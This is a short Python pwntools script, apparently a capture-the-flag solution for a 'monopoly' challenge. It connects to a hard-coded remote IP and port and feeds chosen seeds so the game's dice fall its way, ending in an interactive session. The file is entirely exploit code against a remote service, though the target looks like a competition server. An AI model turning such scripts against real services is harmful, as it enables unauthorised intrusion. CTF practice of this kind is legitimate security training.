from pwn import *
#p = process("monopoly")
p = remote("123.60.25.24",20031)
chance_idx = [3,22,40,51]

name = "ruan"

def throw_dice(seed):
    p.recvuntil("input your choice>>")
    p.sendline("4")
    p.recvuntil("input your choice>>")
    p.sendline("3")
    p.recvuntil("seed>>")
    p.sendline(str(seed))

p.recvuntil("what's your name?")
p.sendline(name)

# chose hard level
p.recvuntil("input your choice>>")
p.sendline("3")
p.recvuntil("seed>>")
p.sendline("7655")

p.recvuntil("%s throw " % name)
p.recvuntil("%s throw " % name)
p.recvuntil("now location: ")
location = int(p.recvuntil(",",drop=True))

info("location : " + str(location))

throw_dice(6400)
throw_dice(0)
throw_dice(10006)
throw_dice(54)
throw_dice(7679)

p.interactive()
